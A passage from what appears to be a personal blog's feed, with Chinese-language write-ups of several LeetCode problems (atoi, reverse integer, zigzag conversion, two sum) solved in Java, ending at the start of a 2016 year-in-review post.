class="number">10</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> (x==result || x==result/<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><blockquote>
<p>这个题从优化和边界检测两个地方考察。</p>
</blockquote>
]]></content>
      <tags>
        <tag>LeetCode-easy</tag>
        <tag>Boundary Check(边界值检测)</tag>
        <tag>Optimize(优化)</tag>
      </tags>
  </entry>
  <entry>
    <title>8. String2Integer</title>
    <url>/2017/01/10/8-String2Integer/</url>
    <content><![CDATA[<p>Implement atoi to convert a string to an integer.</p>
<p><strong>Hint</strong>: Carefully consider all possible input cases. If you want a challenge, please do not see below and ask yourself what are the possible input cases.</p>
<p><strong>Notes</strong>: It is intended for this problem to be specified vaguely (ie, no given input specs). You are responsible to gather all the input requirements up front.</p>
<a id="more"></a>
<h2 id="需要考虑："><a href="#需要考虑：" class="headerlink" title="需要考虑："></a>需要考虑：</h2><blockquote>
<p>1.前面的空格需要去除，从第一个非空数字开始取，一直到第一个非数字字符为止。<br><br>2.int最大最小值的问题需要考虑。</p>
</blockquote>
<h2 id="Boundary-Check"><a href="#Boundary-Check" class="headerlink" title="Boundary Check"></a>Boundary Check</h2><ol>
<li>当数字超过int范围所报的情况，可以使用比int范围更大的long来解决；</li>
<li>当超过long的范围，应该使用异常检测来解决；</li>
<li><strong>字符串应该被合理的截取，以便可以被正确的转化，即使出现异常，也应该是越界异常。</strong></li>
</ol>
<blockquote>
<p>这个题的特殊情况处理起来还是比较麻烦的：</p>
</blockquote>
<table>
<thead>
<tr>
<th>输入</th>
<th>输出</th>
<th>说明 </th>
</tr>
</thead>
<tbody>
<tr>
<td>“   -123abc”</td>
<td>-123</td>
<td>过滤空格和非数字</td>
<td></td>
</tr>
<tr>
<td>“+-123abc”</td>
<td>0</td>
<td>对于多符号数截取了空字符串</td>
<td></td>
</tr>
<tr>
<td>“+-“</td>
<td>0</td>
<td>同上，返回了空字符串</td>
<td></td>
</tr>
<tr>
<td>“2147483648”</td>
<td>2147483647</td>
<td>超过int最大值，返回int最大值</td>
<td></td>
</tr>
<tr>
<td>“-2147483649”</td>
<td>-2147483648</td>
<td>小于int最小值，返回int最小值</td>
<td></td>
</tr>
<tr>
<td>“9223372036854775808”</td>
<td>“2147483647”</td>
<td>超过了long的最大值，转换时应该try{}catch</td>
<td></td>
</tr>
<tr>
<td>“-9223372036854775809”</td>
<td>-2147483648</td>
<td>小于long最小值，同上</td>
<td></td>
</tr>
</tbody>
</table>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">myAtoi</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">char</span> []c = str.toCharArray();</span><br><span class="line">        <span class="keyword">int</span> start = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(start&lt;c.length)&#123;</span><br><span class="line">            <span class="keyword">if</span>(c[start] == <span class="string">' '</span>)</span><br><span class="line">                start ++;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> end = start;</span><br><span class="line">        <span class="keyword">while</span>(end&lt;c.length)&#123;</span><br><span class="line">            <span class="keyword">if</span>((c[end]==<span class="string">'+'</span> || c[end]==<span class="string">'-'</span>) &amp;&amp; (end&lt;c.length-<span class="number">1</span>&amp;&amp;(c[end+<span class="number">1</span>]&gt;=<span class="string">'0'</span> &amp;&amp; c[end+<span class="number">1</span>]&lt;=<span class="string">'9'</span>)))</span><br><span class="line">                end ++;</span><br><span class="line">            <span class="keyword">if</span>(c[end]&gt;=<span class="string">'0'</span> &amp;&amp; c[end]&lt;=<span class="string">'9'</span>)</span><br><span class="line">                end++;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        String target = str.substring(start,end);</span><br><span class="line">        <span class="keyword">if</span>(target.length()==<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="keyword">long</span> result = Long.parseLong(target);</span><br><span class="line">            <span class="keyword">if</span>(result&lt;Integer.MIN_VALUE)</span><br><span class="line">                <span class="keyword">return</span> Integer.MIN_VALUE;</span><br><span class="line">            <span class="keyword">if</span>(result&gt;Integer.MAX_VALUE)</span><br><span class="line">                <span class="keyword">return</span> Integer.MAX_VALUE;</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">int</span>)result;</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            <span class="keyword">if</span>(str.charAt(<span class="number">0</span>)==<span class="string">'-'</span>)</span><br><span class="line">                <span class="keyword">return</span> Integer.MIN_VALUE;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">return</span> Integer.MAX_VALUE;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="遇到的困难"><a href="#遇到的困难" class="headerlink" title="遇到的困难"></a>遇到的困难</h2><blockquote>
<ol>
<li>对于字符串字符的操作，应该尽可能的转化成char数组操作，效率上高于直接操作字符串；</li>
<li>对于while的使用，以及判断是否存在连续的符号，或者正常的符号添加情况判断。</li>
</ol>
</blockquote>
<p>让我来看：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span>(end&lt;c.length)&#123;</span><br><span class="line">    <span class="keyword">if</span>((c[end]==<span class="string">'+'</span> || c[end]==<span class="string">'-'</span>) &amp;&amp; (end&lt;c.length-<span class="number">1</span>&amp;&amp;(c[end+<span class="number">1</span>]&gt;=<span class="string">'0'</span> &amp;&amp; c[end+<span class="number">1</span>]&lt;=<span class="string">'9'</span>)))</span><br><span class="line">        end ++;</span><br><span class="line">    <span class="keyword">if</span>(c[end]&gt;=<span class="string">'0'</span> &amp;&amp; c[end]&lt;=<span class="string">'9'</span>)</span><br><span class="line">        end++;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里是困扰我一会的判断代码。</p>
]]></content>
      <tags>
        <tag>LeetCode-easy</tag>
        <tag>Boundary Check(边界值检测)</tag>
      </tags>
  </entry>
  <entry>
    <title>7. Reverse Integer</title>
    <url>/2017/01/08/7-Reverse-Integer/</url>
    <content><![CDATA[<p>Reverse digits of an integer.</p>
<p><strong>Example1</strong>: x = 123, return 321<br><br><strong>Example2</strong>: x = -123, return -321</p>
<a id="more"></a>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><h2 id="int转换成字符串解决"><a href="#int转换成字符串解决" class="headerlink" title="int转换成字符串解决"></a>int转换成字符串解决</h2><blockquote>
<p>时间复杂度 :O(n) ；空间复杂度: O(n)<br><br>要点在于String转换为int时，如果此时大于int的最大或最小值，会报NumberFormatException：当应用程序试图将字符串转换成一种数值类型，但该字符串不能转换为适当格式时，抛出该异常。<br><br>可以使用异常捕获，将这种错误出现时：return 0;也即就是出现数字越界，返回0。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyReverseInteger</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">reverse</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> tmp = Math.abs(x);</span><br><span class="line">		StringBuffer sb = <span class="keyword">new</span> StringBuffer(tmp+<span class="string">""</span>);</span><br><span class="line">		sb.reverse();</span><br><span class="line">		<span class="keyword">try</span>&#123;</span><br><span class="line">			<span class="keyword">return</span> (x&gt;<span class="number">0</span>?Integer.parseInt(sb.toString()):-Integer.parseInt(sb.toString()));</span><br><span class="line">		&#125;<span class="keyword">catch</span>(NumberFormatException e)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="取模法"><a href="#取模法" class="headerlink" title="取模法"></a>取模法</h2><blockquote>
<p>一个字符占了8位，一个10位数的int值转为String类型占了80位，在空间上开销就很大了。<br><br>直接对int数值取模并获取模值，并拼接是一个好办法。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">reverse</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(x == Integer.MIN_VALUE)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> tmp = Math.abs(x);</span><br><span class="line">        <span class="keyword">long</span> result = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(tmp!=<span class="number">0</span>)&#123;</span><br><span class="line">            result *= <span class="number">10</span>;</span><br><span class="line">            result += tmp%<span class="number">10</span>;</span><br><span class="line">            <span class="keyword">if</span>(result&gt;Integer.MAX_VALUE)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            tmp /= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> x&gt;<span class="number">0</span>?(<span class="keyword">int</span>)result:-(<span class="keyword">int</span>)result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="考察点："><a href="#考察点：" class="headerlink" title="考察点："></a>考察点：<br></h2><blockquote>
<ol>
<li>负数的取模，应该将负数转为正数，并在返回前将符号加上。<br></li>
<li>边界检测：<br><br>a. 使用long类型作为倒叙存储，如果用int类型作为倒叙存储，转换后数字大于int最大值，将会强制抛弃高位。<br><br>b. 对于输入数字检测，当为最小值Integer.MIN_VALUE，Math.abs()函不会去掉负号，应该直接返回0。</li>
</ol>
</blockquote>
]]></content>
      <tags>
        <tag>LeetCode-easy</tag>
        <tag>Boundary Check(边界值检测)</tag>
        <tag>位运算</tag>
      </tags>
  </entry>
  <entry>
    <title>6. ZigZag Conversion</title>
    <url>/2017/01/06/6-ZigZag-Conversion/</url>
    <content><![CDATA[<p>The string <font color="rgb(199,37,78)">“PAYPALISHIRING”</font> is written in a zigzag pattern on a given number of rows like this: (you may want to display this pattern in a fixed font for better legibility)</p>
<pre><code>P   A   H   N
A P L S I I G
Y   I   R
</code></pre><p>And then read line by line: <font color="rgb(199,37,78)">“PAHNAPLSIIGYIR”</font></p>
<p>Write the code that will take a string and make this conversion given a number of rows:</p>
<pre><code>string convert(string text, int nRows);
</code></pre><p><font color="rgb(199,37,78)">convert(“PAYPALISHIRING”, 3)</font> should return <font color="rgb(199,37,78)">“PAHNAPLSIIGYIR”</font>.</p>
<a id="more"></a>
<h1 id="Brute-Force："><a href="#Brute-Force：" class="headerlink" title="Brute Force："></a>Brute Force：</h1><blockquote>
<p>生成numRows个StringBuffer对象;<br><br>从0~n-1循环添加元素共n个，再从n-2到1循环添加元素共n-2个；<br><br>外层使用while循环，自增通过索引内 i++。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span>(i&lt;str.length)&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;numRows&amp;&amp;i&lt;str.length;j++)</span><br><span class="line">		sb[j].append(str[i++]);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> k=numRows-<span class="number">2</span>;k&gt;<span class="number">0</span>&amp;&amp;i&lt;str.length;k--)</span><br><span class="line">		sb[k].append(str[i++]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>时间复杂度是O(n)。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">convert</span><span class="params">(String s, <span class="keyword">int</span> numRows)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">char</span> c[] = s.toCharArray();</span><br><span class="line">        StringBuffer sb[] = <span class="keyword">new</span> StringBuffer[numRows];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;sb.length;j++)</span><br><span class="line">            sb[j] = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">        <span class="keyword">int</span> low = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(low &lt; c.length)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;numRows &amp;&amp; low&lt;c.length;i++)</span><br><span class="line">                sb[i].append(c[low++]);</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=numRows-<span class="number">2</span>;j&gt;<span class="number">0</span> &amp;&amp; low&lt;c.length;j--)</span><br><span class="line">                sb[j].append(c[low++]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;sb.length;i++)</span><br><span class="line">            sb[<span class="number">0</span>].append(sb[i]);</span><br><span class="line">        <span class="keyword">return</span> sb[<span class="number">0</span>].toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="嵌套指针法："><a href="#嵌套指针法：" class="headerlink" title="嵌套指针法："></a>嵌套指针法：</h1><blockquote>
<p>该方法的精髓在于：建立新的数组存储每一个元素对应的新数组的索引（需要先建立numRows个StringBuffer对象）</p>
</blockquote>
<pre><code>/*n=numRows
Δ=2n-2    0                           2n-2                       4n-4
Δ=        1                     2n-3  2n-1                4n-5   4n-3
Δ=        2               2n-4        2n              4n-4       .
Δ=        .           .               .               .            .
Δ=        .       n+1                 .           3n+1              .
Δ=        n-2 n                       3n-4    3n                 5n-6
Δ=2n-2    n-1                         3n-3                       5n-5
*/
</code></pre><p>其时间复杂度为O(n)。</p>
<p>核心算法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">index[i] = i%(<span class="number">2</span>*numRows-<span class="number">2</span>);</span><br><span class="line"><span class="keyword">if</span>(index[i]&gt;(numRows-<span class="number">1</span>))</span><br><span class="line">	index[i] = (<span class="number">2</span>*numRows-<span class="number">2</span>)-index[i];</span><br><span class="line"></span><br><span class="line"><span class="number">0</span>     <span class="number">6</span></span><br><span class="line"><span class="number">1</span>  <span class="number">5</span>  <span class="number">7</span></span><br><span class="line"><span class="number">2</span>  <span class="number">4</span>  <span class="number">8</span></span><br><span class="line"><span class="number">3</span>     <span class="number">9</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>每6个数为一个循环，可知模数<code>2n-2</code><br><br>但是，斜着上去的那一行算出了<code>补数</code>，需要用模数去减它才可以得到正确的行数。</p>
</blockquote>
<p>找规律：2*n-2，n指一列的长度。 </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">convert</span><span class="params">(String s, <span class="keyword">int</span> numRows)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(numRows == <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> s;</span><br><span class="line">        <span class="keyword">char</span> c[] = s.toCharArray();</span><br><span class="line">        StringBuffer sb[] = <span class="keyword">new</span> StringBuffer[numRows];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;sb.length;i++)</span><br><span class="line">            sb[i] = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">        <span class="keyword">int</span> index[] = <span class="keyword">new</span> <span class="keyword">int</span>[c.length];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;c.length;i++)&#123;</span><br><span class="line">            index[i] = i % (<span class="number">2</span>*numRows-<span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span>(index[i]&gt;numRows-<span class="number">1</span>)</span><br><span class="line">                index[i] = <span class="number">2</span>*numRows-<span class="number">2</span> - index[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;c.length;j++)</span><br><span class="line">            sb[index[j]].append(c[j]);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">1</span>;k&lt;sb.length;k++)</span><br><span class="line">            sb[<span class="number">0</span>].append(sb[k]);</span><br><span class="line">        <span class="keyword">return</span> sb[<span class="number">0</span>].toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Boundary-Check"><a href="#Boundary-Check" class="headerlink" title="Boundary Check"></a>Boundary Check</h2><blockquote>
<p>嵌套指针会遇到一个异常，除零异常。那么，应该检测<code>numRows</code>值是否为<code>1</code>，如果为<code>1</code>，则应该直接返回字符串<code>s</code>。</p>
</blockquote>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><blockquote>
<ol>
<li>这道题直接去解，是一个好方法，但是明显是一个索引递增的循环。</li>
<li>嵌套指针的使用可以更巧妙的解决这道题目，至于巧在哪里？比直接循环好在，封装了每行的索引生成，通过列高可以计算出每个元素相应的行索引。</li>
</ol>
</blockquote>
]]></content>
      <tags>
        <tag>LeetCode-easy</tag>
        <tag>嵌套指针</tag>
      </tags>
  </entry>
  <entry>
    <title>1.TwoSum</title>
    <url>/2017/01/06/1-TwoSum/</url>
    <content><![CDATA[<p>Given an array of integers, return <strong>indices</strong> of the two numbers such that they add up to a specific target.</p>
<p>You may assume that each input would have <strong><em>exactly</em></strong> one solution.</p>
<p><strong>Example:</strong></p>
<pre><code>Given nums = [2, 7, 11, 15], target = 9,

Because nums[0] + nums[1] = 2 + 7 = 9,
return [0, 1].
</code></pre><a id="more"></a>
<h1 id="爆破法："><a href="#爆破法：" class="headerlink" title="爆破法："></a>爆破法：</h1><blockquote>
<p>通过两次遍历数组，找出所有两个数的组合，将结果与target比较，返回满足要求的索引，这种方法简单易懂，但是如果寻找三个数或者以上的多位相加，他的时间复杂度是指数增长的。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	Standard Brute Forced method to solve;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TwoSum</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span>[] twoSum(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> target)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i&lt;nums.length;i++)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j = i+<span class="number">1</span>;j&lt;nums.length;j++)&#123;</span><br><span class="line">				<span class="keyword">if</span>(target-nums[i] == nums[j])</span><br><span class="line">					<span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">int</span>[] &#123;i,j&#125;;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"No Such Two Arguments"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>上面这是一种标准的暴力破解方法，简单易懂，但是如果是找三个或者4个，这种多层的嵌套不利于。应该借助下面这种封装的方式来避免多层（3层以上的）嵌套。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">This method is a Brute Forced method.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">time completicity is O(n2);</span></span><br><span class="line"><span class="comment">space complicity is O(1);</span></span><br><span class="line"><span class="comment">beats: 25%;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TwoSum</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] twoSum(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> target) &#123;</span><br><span class="line">    	<span class="keyword">int</span> []ret = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">2</span>];</span><br><span class="line">    	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>,j=i;i&lt;nums.length;i++)&#123;</span><br><span class="line">    			<span class="keyword">int</span> tmp = target-nums[i];</span><br><span class="line">    			<span class="keyword">if</span>(ret[<span class="number">1</span>]==<span class="number">0</span>)&#123;</span><br><span class="line">    				ret[<span class="number">0</span>] = i; </span><br><span class="line">					ret[<span class="number">1</span>] = <span class="keyword">this</span>.find(nums,tmp,++j);</span><br><span class="line">    			&#125;<span class="keyword">else</span></span><br><span class="line">    				<span class="keyword">break</span>;</span><br><span class="line">    	&#125;</span><br><span class="line">    	<span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span>[] nums,<span class="keyword">int</span> target,<span class="keyword">int</span> lo)</span></span>&#123;</span><br><span class="line">    	<span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">    	<span class="keyword">for</span>(<span class="keyword">int</span> i=lo;i&lt;nums.length;i++)&#123;</span><br><span class="line">    		<span class="keyword">if</span>(target&lt;nums[i]) <span class="keyword">continue</span>;</span><br><span class="line">    		<span class="keyword">if</span>(target == nums[i])&#123;</span><br><span class="line">    			ret = i;</span><br><span class="line">    			<span class="keyword">break</span>;</span><br><span class="line">    		&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="Hash法："><a href="#Hash法：" class="headerlink" title="Hash法："></a>Hash法：</h1><blockquote>
<p>HashMap的数据结构是树，使用HashMap，它的查询时的时间复杂度是O(n+logn)。<br></p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Beats : 45%;</span></span><br><span class="line"><span class="comment">Time complicity is O(n);</span></span><br><span class="line"><span class="comment">Space complicity is O(n);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TwoSum3</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span>[] twoSum(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> target)&#123;</span><br><span class="line">		Map&lt;Integer,Integer&gt; map = <span class="keyword">new</span> HashMap();</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;nums.length;i++)&#123;</span><br><span class="line">			map.put(nums[i],i);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;nums.length;j++)&#123;</span><br><span class="line">			 <span class="comment">// We don't need two same elements!</span></span><br><span class="line">			<span class="keyword">if</span>(map.containsKey(target-nums[j])&amp;&amp;(map.get(target-nums[j])!=j))&#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">int</span>[] &#123;j,map.get(target-nums[j])&#125;;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"No Such Two Arguments"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="疑惑"><a href="#疑惑" class="headerlink" title="疑惑"></a>疑惑</h2><blockquote>
<p>[{0,-2,0,0},0],对于这样的查询，HashMap中存放了相同的key的情况，是覆盖了前面<br>两个0的索引，所以答案是(0,3);</p>
</blockquote>
<h1 id="引申问题"><a href="#引申问题" class="headerlink" title="引申问题"></a>引申问题</h1><blockquote>
<p>如果问题换成返回数组的值，而不是元素的索引，其实还有更好的办法。</p>
</blockquote>
<h2 id="逼近法"><a href="#逼近法" class="headerlink" title="逼近法"></a>逼近法</h2><blockquote>
<p>1.将数组排序，使用快排或者归并排序，时间复杂度为O（nlogn）。<br><br>2.使用两个索引，分别从头和尾部逼近，如果相加小于target，那么头部索引++；如果大于，则尾部索引–，直到找到。<br><br>3.时间复杂度总共为O（nlogn+n）。<br></p>
<p>缺点：只能返回元素的值，由于排序打乱了索引。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">This method is found the 2 nums sum is target ,but the return isn't the index!</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TwoSum4</span></span>&#123;</span><br><span class="line">	<span class="comment">/*the return isn't index,it is a array of values*/</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span>[] twoSum(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> target)&#123;</span><br><span class="line">		Arrays.sort(nums);</span><br><span class="line">		<span class="keyword">int</span> lo = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">int</span> hi = nums.length-<span class="number">1</span>;</span><br><span class="line">		<span class="keyword">while</span>(lo&lt;hi)&#123;</span><br><span class="line">			<span class="keyword">if</span>(nums[lo]+nums[hi]==target) <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;nums[lo],nums[hi]&#125;;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span>(nums[lo]+nums[hi] &gt; target) hi--;</span><br><span class="line">			<span class="keyword">else</span> lo++;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"No Such Two Arguments"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><blockquote>
<p>这道题有两个目的：</p>
<ol>
<li>通过找两个数的和，接下来还有找三个数的四个数的，那么多层嵌套是非常反逻辑的，会把你带到逻辑漩涡里。所以，封装成找两个数的和，三个数的等这些<code>函数</code>后，那么问题被简化了。</li>
<li>逼近法是一个很好的查找元素的思路，对于数组先排序，利用数组的有序性，通过<code>双索引+逼近法</code>。但是，缺点是排序打乱了索引，只能查找元素值。</li>
</ol>
</blockquote>
]]></content>
      <tags>
        <tag>LeetCode-easy</tag>
        <tag>双指针+逼近法</tag>
      </tags>
  </entry>
  <entry>
    <title>2016总结</title>
    <url>/2017/01/02/2016%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<blockquote>
<p>我觉得，总结这种事情，不是通过总结来展示自己过去做了什么，可以说什么。更应该是通过总结，来得知自己和目标之间又近了多少，未来应该如何走。</p>
</blockquote>
<a id="more"></a>
<h2 id="毕业"><a href="#毕业" class="headerlink" title="毕业"></a>毕业</h2><blockquote>
<p>上半年基本上忙着毕业了，一二月份基本过年懈怠了。但是，看到一条新闻，Alphago要在3月挑战人类围棋，感觉很震撼，上一次是深蓝在1997年国际象棋成功战胜人类。计算机在这19年里更进一步了，不单单是暴力计算这么简单了。<br><br>三月份去了杭州实习，认识了许多人，见到了很多不同的人。一个月很快就过去了，看到了李世石败给了Alphago，见证了围棋上计算机的历史时刻。<br><br>四五月份忙着毕业设计了，了解了Spring框架和Hibernate框架，总的感觉，框架这种东西，很难去描述它，使用框架本身没有意义，还是应该多去了解框架本身的设计以及解决了什么问题，这才是框架被设计出来的意义。<br><br>六月份忙着结束大学生涯了，顺便和舍友去了九寨沟，九寨沟真的很漂亮，是我见过的最漂亮的山水。月底到了公司报到。<br></p>
</blockquote>
<h2 id="工作"><a href="#工作" class="headerlink" title="工作"></a>工作</h2><blockquote>
